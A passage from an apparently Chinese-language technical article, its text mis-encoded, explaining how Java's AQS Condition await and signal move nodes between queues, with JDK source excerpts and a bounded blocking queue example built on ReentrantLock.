<p>å½“çº¿ç¨‹åœ¨æŒæœ‰é”çš„å‰æä¸‹è°ƒç”¨ <code>condition.await()</code>ï¼Œå®ƒä¼šå…ˆæŠŠè‡ªå·±ä»åŒæ­¥é˜Ÿåˆ—ç§»åˆ°æ¡ä»¶é˜Ÿåˆ—ï¼Œé‡Šæ”¾æ‰å½“å‰æŒæœ‰çš„é”ï¼Œç„¶åé€šè¿‡ <code>LockSupport.park()</code> é˜»å¡è‡ªå·±ã€‚ä¹‹åï¼Œå½“å…¶å®ƒçº¿ç¨‹åœ¨æŒæœ‰åŒä¸€æŠŠé”çš„æƒ…å†µä¸‹è°ƒç”¨ <code>condition.signal()</code> æˆ– <code>signalAll()</code>ï¼Œè¢«å”¤é†’çš„èŠ‚ç‚¹ä¼šä»æ¡ä»¶é˜Ÿåˆ—è¢«è½¬ç§»å›åŒæ­¥é˜Ÿåˆ—ï¼Œæ­¤æ—¶å®ƒå¹¶æ²¡æœ‰ç«‹åˆ»æ¢å¤æ‰§è¡Œï¼Œè€Œæ˜¯é‡æ–°å»å‚ä¸ AQS çº§åˆ«çš„æŠ¢é”ï¼Œåªæœ‰å½“å†æ¬¡è·å–åˆ°é”ä¹‹åæ‰çœŸæ­£è¿”å› <code>await()</code> ä¹‹åçš„é‚£ä¸€è¡Œå»ç»§ç»­æ‰§è¡Œã€‚</p>
<p>è¿™æ ·ï¼ŒCondition ä¿è¯äº†â€œç­‰å¾…æ¡ä»¶æ—¶å…ˆé‡Šæ”¾é”ï¼Œé¿å…å ç€é”ç¡è§‰ï¼›æ¡ä»¶æ»¡è¶³æ—¶å…ˆå”¤é†’ï¼Œå†æŒ‰é”çš„æ’é˜Ÿè§„åˆ™ä¾æ¬¡ç»§ç»­â€çš„è¯­ä¹‰ï¼Œè¿™æ¯”ç›´æ¥ <code>Object.wait/notify</code> è¦æ¸…æ™°å’Œå¼ºå¤§å¾—å¤šï¼Œå°¤å…¶åœ¨å­˜åœ¨å¤šä¸ªæ¡ä»¶æ—¶ã€‚</p>
<h4 data-id="heading-122">4.1 ä¸¤ä¸ªé˜Ÿåˆ—çš„å…³ç³»</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7b1ccd29a87452faaf47798c2c29020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=DBgCkoKUuC3UL7ptHYqwnKJ6%2F9E%3D" alt="sync-condition-queues.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-123">4.2 èŠ‚ç‚¹æµè½¬è¿‡ç¨‹</h4>
<p>å½“è°ƒç”¨<code>await()</code>å’Œ<code>signal()</code>æ—¶ï¼ŒèŠ‚ç‚¹ä¼šåœ¨ä¸¤ä¸ªé˜Ÿåˆ—ä¹‹é—´æµè½¬ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as çº¿ç¨‹
    participant SQ as åŒæ­¥é˜Ÿåˆ—
    participant CQ as æ¡ä»¶é˜Ÿåˆ—
    participant Lock as é”
    
    Note over T: æŒæœ‰é”
    T-&gt;&gt;CQ: await() - åˆ›å»ºèŠ‚ç‚¹åŠ å…¥æ¡ä»¶é˜Ÿåˆ—
    T-&gt;&gt;Lock: é‡Šæ”¾é”
    Note over T: é˜»å¡åœ¨æ¡ä»¶é˜Ÿåˆ—
    
    Note over T: å…¶ä»–çº¿ç¨‹signal()
    CQ-&gt;&gt;SQ: èŠ‚ç‚¹ä»æ¡ä»¶é˜Ÿåˆ—è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—
    Note over T: ç­‰å¾…è·å–é”
    
    SQ-&gt;&gt;T: è·å–åˆ°é”
    Note over T: await()è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
</code></pre>
<hr/>
<h3 data-id="heading-124">5. awaitæ ¸å¿ƒæµç¨‹</h3>
<h4 data-id="heading-125">5.1 awaitæ–¹æ³•æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-comment">// â‘  æ£€æŸ¥ä¸­æ–­</span>
    <span class="hljs-keyword">if</span> (Thread.interrupted())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InterruptedException</span>();
    
    <span class="hljs-comment">// â‘¡ åˆ›å»ºèŠ‚ç‚¹åŠ å…¥æ¡ä»¶é˜Ÿåˆ—</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> addConditionWaiter();
    
    <span class="hljs-comment">// â‘¢ å®Œå…¨é‡Šæ”¾é”ï¼ˆåŒ…æ‹¬é‡å…¥ï¼‰ï¼Œä¿å­˜state</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">savedState</span> <span class="hljs-operator">=</span> fullyRelease(node);
    
    <span class="hljs-type">int</span> <span class="hljs-variable">interruptMode</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// â‘£ å¾ªç¯æ£€æŸ¥æ˜¯å¦åœ¨åŒæ­¥é˜Ÿåˆ—ä¸­</span>
    <span class="hljs-keyword">while</span> (!isOnSyncQueue(node)) {
        LockSupport.park(<span class="hljs-built_in">this</span>);  <span class="hljs-comment">// é˜»å¡</span>
        
        <span class="hljs-comment">// æ£€æŸ¥ä¸­æ–­</span>
        <span class="hljs-keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="hljs-number">0</span>)
            <span class="hljs-keyword">break</span>;
    }
    
    <span class="hljs-comment">// â‘¤ é‡æ–°è·å–é”</span>
    <span class="hljs-keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)
        interruptMode = REINTERRUPT;
    
    <span class="hljs-comment">// â‘¥ æ¸…ç†æ¡ä»¶é˜Ÿåˆ—ä¸­çš„å–æ¶ˆèŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (node.nextWaiter != <span class="hljs-literal">null</span>)
        unlinkCancelledWaiters();
    
    <span class="hljs-comment">// â‘¦ å¤„ç†ä¸­æ–­</span>
    <span class="hljs-keyword">if</span> (interruptMode != <span class="hljs-number">0</span>)
        reportInterruptAfterWait(interruptMode);
}
</code></pre>
<h4 data-id="heading-126">5.2 awaitæµç¨‹å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d12743c7e314d05a4dc2cbbd2666710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=v0YdBS7L8sn9ASXV0qWlYAlGxx8%3D" alt="acquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-127">5.3 addConditionWaiter - åŠ å…¥æ¡ä»¶é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addConditionWaiter</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> lastWaiter;
    
    <span class="hljs-comment">// æ¸…ç†å·²å–æ¶ˆçš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span> &amp;&amp; t.waitStatus != Node.CONDITION) {
        unlinkCancelledWaiters();
        t = lastWaiter;
    }
    
    <span class="hljs-comment">// åˆ›å»ºCONDITIONçŠ¶æ€çš„èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), Node.CONDITION);
    
    <span class="hljs-comment">// åŠ å…¥é˜Ÿå°¾</span>
    <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>)
        firstWaiter = node;
    <span class="hljs-keyword">else</span>
        t.nextWaiter = node;
    lastWaiter = node;
    
    <span class="hljs-keyword">return</span> node;
}
</code></pre>
<h4 data-id="heading-128">5.4 fullyRelease - å®Œå…¨é‡Šæ”¾é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fullyRelease</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">savedState</span> <span class="hljs-operator">=</span> getState();  <span class="hljs-comment">// ä¿å­˜å½“å‰stateï¼ˆé‡å…¥æ¬¡æ•°ï¼‰</span>
        
        <span class="hljs-comment">// é‡Šæ”¾æ‰€æœ‰é‡å…¥</span>
        <span class="hljs-keyword">if</span> (release(savedState)) {
            failed = <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">return</span> savedState;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            node.waitStatus = Node.CANCELLED;
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¦å®Œå…¨é‡Šæ”¾ï¼Ÿ</strong></p>
<p>å› ä¸ºawaitæ—¶å¿…é¡»è®©å‡ºé”ï¼Œå¦åˆ™å…¶ä»–çº¿ç¨‹æ— æ³•è·å–é”æ¥è°ƒç”¨signalã€‚ä¿å­˜stateæ˜¯ä¸ºäº†awaitè¿”å›åæ¢å¤åŸæ¥çš„é‡å…¥æ¬¡æ•°ã€‚</p>
<h4 data-id="heading-129">5.5 isOnSyncQueue - æ£€æŸ¥æ˜¯å¦åœ¨åŒæ­¥é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOnSyncQueue</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// CONDITIONçŠ¶æ€æˆ–prevä¸ºnullï¼Œè‚¯å®šä¸åœ¨åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-keyword">if</span> (node.waitStatus == Node.CONDITION || node.prev == <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// æœ‰nextï¼Œè‚¯å®šåœ¨åŒæ­¥é˜Ÿåˆ—</span>
    <span class="hljs-keyword">if</span> (node.next != <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-comment">// ä»tailå‘å‰æœç´¢</span>
    <span class="hljs-keyword">return</span> findNodeFromTail(node);
}
</code></pre>
<hr/>
<h3 data-id="heading-130">6. signalæ ¸å¿ƒæµç¨‹</h3>
<h4 data-id="heading-131">6.1 signalæ–¹æ³•æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">signal</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// â‘  æ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-comment">// â‘¡ è·å–æ¡ä»¶é˜Ÿåˆ—é¦–èŠ‚ç‚¹</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> firstWaiter;
    <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>)
        doSignal(first);
}
</code></pre>
<h4 data-id="heading-132">6.2 doSignal - æ‰§è¡Œå”¤é†’</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSignal</span><span class="hljs-params">(Node first)</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-comment">// ç§»é™¤é¦–èŠ‚ç‚¹</span>
        <span class="hljs-keyword">if</span> ((firstWaiter = first.nextWaiter) == <span class="hljs-literal">null</span>)
            lastWaiter = <span class="hljs-literal">null</span>;
        first.nextWaiter = <span class="hljs-literal">null</span>;
        
    <span class="hljs-comment">// è½¬ç§»èŠ‚ç‚¹ï¼Œå¦‚æœå¤±è´¥åˆ™å°è¯•ä¸‹ä¸€ä¸ª</span>
    } <span class="hljs-keyword">while</span> (!transferForSignal(first) &amp;&amp;
             (first = firstWaiter) != <span class="hljs-literal">null</span>);
}
</code></pre>
<h4 data-id="heading-133">6.3 transferForSignal - è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferForSignal</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// â‘  å°†èŠ‚ç‚¹çŠ¶æ€ä»CONDITIONæ”¹ä¸º0</span>
    <span class="hljs-keyword">if</span> (!compareAndSetWaitStatus(node, Node.CONDITION, <span class="hljs-number">0</span>))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// èŠ‚ç‚¹å·²å–æ¶ˆ</span>
    
    <span class="hljs-comment">// â‘¡ åŠ å…¥åŒæ­¥é˜Ÿåˆ—å°¾éƒ¨</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> enq(node);
    
    <span class="hljs-comment">// â‘¢ è®¾ç½®å‰é©±çŠ¶æ€ä¸ºSIGNALï¼Œç¡®ä¿èƒ½è¢«å”¤é†’</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> p.waitStatus;
    <span class="hljs-keyword">if</span> (ws &gt; <span class="hljs-number">0</span> || !compareAndSetWaitStatus(p, ws, Node.SIGNAL))
        LockSupport.unpark(node.thread);  <span class="hljs-comment">// å‰é©±å–æ¶ˆæˆ–CASå¤±è´¥ï¼Œç›´æ¥å”¤é†’</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-134">6.4 signalæµç¨‹å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dce017eff344d35b70ee75e11adf654~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=BZE6wvikS2yGDgex7H1jx9bnooc%3D" alt="signal-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-135">6.5 signalAll - å”¤é†’æ‰€æœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">signalAll</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> firstWaiter;
    <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>)
        doSignalAll(first);
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSignalAll</span><span class="hljs-params">(Node first)</span> {
    <span class="hljs-comment">// æ¸…ç©ºæ¡ä»¶é˜Ÿåˆ—</span>
    lastWaiter = firstWaiter = <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// é€ä¸ªè½¬ç§»æ‰€æœ‰èŠ‚ç‚¹</span>
    <span class="hljs-keyword">do</span> {
        <span class="hljs-type">Node</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> first.nextWaiter;
        first.nextWaiter = <span class="hljs-literal">null</span>;
        transferForSignal(first);
        first = next;
    } <span class="hljs-keyword">while</span> (first != <span class="hljs-literal">null</span>);
}
</code></pre>
<hr/>
<h3 data-id="heading-136">7. æœ‰ç•Œé˜»å¡é˜Ÿåˆ—</h3>
<h4 data-id="heading-137">7.1 è®¾è®¡æ€è·¯</h4>
<p>ä½¿ç”¨ä¸¤ä¸ªConditionå®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f8d93f037ca49aaaf36bd585918b6e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=6cFdE3TMN8Q5Ct67eYEhYaUzRTk%3D" alt="bounded-queue-design.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-138">7.2 å®Œæ•´å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åŸºäºReentrantLockå’ŒConditionçš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—
 * <span class="hljs-doctag">@param</span> &lt;E&gt; å…ƒç´ ç±»å‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BoundedBlockingQueue</span>&lt;E&gt; {
    
    <span class="hljs-comment">/** åº•å±‚å­˜å‚¨ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] items;
    
    <span class="hljs-comment">/** é˜Ÿåˆ—å®¹é‡ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> capacity;
    
    <span class="hljs-comment">/** å½“å‰å…ƒç´ æ•°é‡ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count;
    
    <span class="hljs-comment">/** ä¸‹ä¸€ä¸ªputçš„ä½ç½® */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> putIndex;
    
    <span class="hljs-comment">/** ä¸‹ä¸€ä¸ªtakeçš„ä½ç½® */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> takeIndex;
    
    <span class="hljs-comment">/** ä¸»é” */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantLock lock;
    
    <span class="hljs-comment">/** éç©ºæ¡ä»¶ï¼šæ¶ˆè´¹è€…ç­‰å¾… */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    
    <span class="hljs-comment">/** éæ»¡æ¡ä»¶ï¼šç”Ÿäº§è€…ç­‰å¾… */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    
    <span class="hljs-comment">/**
     * æ„é€ æ–¹æ³•
     * <span class="hljs-doctag">@param</span> capacity é˜Ÿåˆ—å®¹é‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BoundedBlockingQueue</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> {
        <span class="hljs-keyword">if</span> (capacity &lt;= <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>();
        
        <span class="hljs-built_in">this</span>.capacity = capacity;
        <span class="hljs-built_in">this</span>.items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[capacity];
        <span class="hljs-built_in">this</span>.lock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
        <span class="hljs-built_in">this</span>.notEmpty = lock.newCondition();
        <span class="hljs-built_in">this</span>.notFull = lock.newCondition();
    }
    
    <span class="hljs-comment">/**
     * æ”¾å…¥å…ƒç´ ï¼ˆé˜»å¡ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(E element)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">if</span> (element == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—æ»¡æ—¶ï¼Œç­‰å¾…notFullæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == capacity) {
                notFull.await();
            }
            
            <span class="hljs-comment">// æ”¾å…¥å…ƒç´ </span>
            enqueue(element);
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å–å‡ºå…ƒç´ ï¼ˆé˜»å¡ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">take</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é˜Ÿåˆ—ç©ºæ—¶ï¼Œç­‰å¾…notEmptyæ¡ä»¶</span>
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                notEmpty.await();
            }
            
            <span class="hljs-comment">// å–å‡ºå…ƒç´ </span>
            <span class="hljs-keyword">return</span> dequeue();
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * æ”¾å…¥å…ƒç´ ï¼ˆè¶…æ—¶ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E element, <span class="hljs-type">long</span> timeout, TimeUnit unit)</span> 
            <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">if</span> (element == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();
        
        <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> unit.toNanos(timeout);
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (count == capacity) {
                <span class="hljs-keyword">if</span> (nanos &lt;= <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                nanos = notFull.awaitNanos(nanos);
            }
            
            enqueue(element);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å–å‡ºå…ƒç´ ï¼ˆè¶…æ—¶ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> unit.toNanos(timeout);
        
        lock.lockInterruptibly();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">if</span> (nanos &lt;= <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
                nanos = notEmpty.awaitNanos(nanos);
            }
            
            <span class="hljs-keyword">return</span> dequeue();
            
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å…¥é˜Ÿï¼ˆå†…éƒ¨æ–¹æ³•ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">enqueue</span><span class="hljs-params">(E element)</span> {
        items[putIndex] = element;
        <span class="hljs-keyword">if</span> (++putIndex == capacity)
            putIndex = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¾ªç¯æ•°ç»„</span>
        count++;
        
        notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
    }
    
    <span class="hljs-comment">/**
     * å‡ºé˜Ÿï¼ˆå†…éƒ¨æ–¹æ³•ï¼‰
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> E <span class="hljs-title function_">dequeue</span><span class="hljs-params">()</span> {
        <span class="hljs-type">E</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> (E) items[takeIndex];
        items[takeIndex] = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// help GC</span>
        <span class="hljs-keyword">if</span> (++takeIndex == capacity)
            takeIndex = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¾ªç¯æ•°ç»„</span>
        count--;
        
        notFull.signal();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
        <span class="hljs-keyword">return</span> element;
    }
    
    <span class="hljs-comment">/**
     * è·å–å½“å‰å…ƒç´ æ•°é‡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> count;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> size() == <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-comment">/**
     * åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> size() == capacity;
    }
}
</code></pre>
<h4 data-id="heading-139">7.3 ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockingQueueDemo</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        BoundedBlockingQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BoundedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">5</span>);
        
        <span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                    queue.put(i);
                    System.out.println(<span class="hljs-string">"ç”Ÿäº§: "</span> + i + <span class="hljs-string">", é˜Ÿåˆ—å¤§å°: "</span> + queue.size());
                    Thread.sleep(<span class="hljs-number">100</span>);
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }, <span class="hljs-string">"Producer"</span>);
        
        <span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
                    <span class="hljs-type">Integer</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.take();
                    System.out.println(<span class="hljs-string">"æ¶ˆè´¹: "</span> + item + <span class="hljs-string">", é˜Ÿåˆ—å¤§å°: "</span> + queue.size());
                    Thread.sleep(<span class="hljs-number">200</span>);  <span class="hljs-comment">// æ¶ˆè´¹æ…¢äºç”Ÿäº§</span>
                }
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }, <span class="hljs-string">"Consumer"</span>);
        
        producer.start();
        consumer.start();
    }
}
</code></pre>
<h4 data-id="heading-140">7.4 ä¸ArrayBlockingQueueå¯¹æ¯”</h4>
<p>æˆ‘ä»¬å®ç°çš„<code>BoundedBlockingQueue</code>ä¸JDKçš„<code>ArrayBlockingQueue</code>è®¾è®¡æ€è·¯ä¸€è‡´ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ArrayBlockingQueueæºç ï¼ˆç®€åŒ–ï¼‰</span>
